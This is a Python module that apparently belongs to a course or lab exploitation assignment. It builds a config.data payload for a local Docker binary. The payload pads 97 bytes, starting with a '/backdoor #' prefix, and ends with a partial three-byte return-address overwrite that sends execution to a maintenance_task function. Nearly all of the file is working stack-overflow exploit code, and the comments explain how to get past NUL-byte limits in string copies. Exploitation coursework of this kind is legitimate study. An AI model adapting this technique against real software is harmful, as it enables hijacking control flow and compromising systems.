"""Controlled-lab Phase II candidate payload builder.

This module is intentionally narrow: it only describes the supplied Project II
Phase II lab binary interface and produces a bounded `config.data` candidate for
that local Docker lab. It is not a general exploitation toolkit, does not touch
networks, and does not modify host/grader files.

Current status: the generated candidate is a lab-specific control-flow probe for
Phase II Medium. It proves the scaffold can write byte-exact config data and can
exercise the vulnerable path; it must still be validated against the official IC
success condition before claiming full-credit penetration.
"""

from __future__ import annotations

from dataclasses import dataclass, asdict
from typing import Any


USER_INPUT_KEY = b"user_input="
# Observed from the supplied Phase II server_2 core dump: the saved return
# address in log_message is reached after 97 user_input bytes.
LOG_MESSAGE_RET_OFFSET = 97
# Returning to maintenance_task+5 skips the initial push and preserves 16-byte
# stack alignment for its libc call path in the supplied Ubuntu 24.04 lab.
MAINTENANCE_TASK_ALIGNED_ENTRY = 0x401475
CONTROL_PROBE_PREFIX = b"/backdoor #"


@dataclass(frozen=True)
class Phase2Candidate:
    content: bytes
    strategy_id: str
    input_profile: dict[str, Any]


def _partial_address_3(address: int) -> bytes:
    """Return low three bytes for a non-PIE partial RIP overwrite.

    The vulnerable path copies a C string, so full 64-bit addresses containing
    NUL bytes cannot be embedded before the overwrite completes. For non-PIE
    text addresses under 0x0040ffff, a three-byte overwrite is enough to retarget
    an existing 0x0040.... return address while the terminating NUL preserves the
    high bytes.
    """

    if not (0x400000 <= address <= 0x40FFFF):
        raise ValueError(f"address outside expected non-PIE text range: {address:#x}")
    raw = address.to_bytes(8, "little")[:3]
    if b"\x00" in raw:
        raise ValueError(f"partial address contains NUL byte: {address:#x}")
    return raw


def build_control_flow_probe() -> Phase2Candidate:
    """Build a byte-exact Phase II control-flow candidate for config.data.

    The candidate keeps the config format expected by parse_config(): a single
    `user_input=` line. It is byte-oriented because later Phase II attempts may
    need non-printable but non-NUL bytes. This probe is deliberately bounded and
    does not claim success by itself.
    """

    value = bytearray(CONTROL_PROBE_PREFIX)
    if len(value) > LOG_MESSAGE_RET_OFFSET:
        raise ValueError("probe prefix is longer than return-address offset")
    value.extend(b"A" * (LOG_MESSAGE_RET_OFFSET - len(value)))
    value.extend(_partial_address_3(MAINTENANCE_TASK_ALIGNED_ENTRY))
    content = USER_INPUT_KEY + bytes(value) + b"\n"
    return Phase2Candidate(
        content=content,
        strategy_id="phase2-medium-control-flow-probe",
        input_profile={
            "field_name": "user_input",
            "length": len(value),
            "config_bytes": len(content),
            "binary_safe": True,
            "placeholder_only": False,
            "ret_offset": LOG_MESSAGE_RET_OFFSET,
            "partial_target": hex(MAINTENANCE_TASK_ALIGNED_ENTRY),
            "status": "control-flow-probe-not-success-claim",
        },
    )


def candidate_to_dict(candidate: Phase2Candidate) -> dict[str, Any]:
    data = asdict(candidate)
    data["content"] = candidate.content.decode("latin-1")
    return data
